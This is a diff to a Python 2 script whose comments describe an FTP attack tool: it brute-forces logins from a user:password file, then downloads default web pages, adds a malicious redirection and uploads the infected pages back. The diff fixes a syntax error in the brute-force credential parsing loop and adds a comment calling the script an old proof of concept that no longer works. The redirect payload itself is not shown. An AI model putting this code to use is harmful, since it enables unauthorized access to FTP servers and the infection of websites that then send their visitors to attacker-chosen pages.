@@ -6,6 +6,7 @@
 #search for default web pages. For each of these pages,
 #download a copy and adds a malicious redirection.
 #upload the infected page back to the FTP server
+#THIS SCRIPT IS A OLD PROOF OF CONCEPT, THIS NOT WORKS NOW.
 #Contact: marbrb1@gmail.com
 
 import ftplib
@@ -34,7 +35,7 @@ def bruteLogin(hostname, passFile):
     for line in passFile.readlines():
         time.sleep(1)
         user = line.split(":")[0]
-        passwd = line.split(":")[1]s.strip("\r").strip("\n")
+        passwd = line.split(":")[1].strip("\r").strip("\n")
         print "[*] Trying {}/{}".format(user,passwd)
         try:
             ftp = ftplib.FTP(hostname)
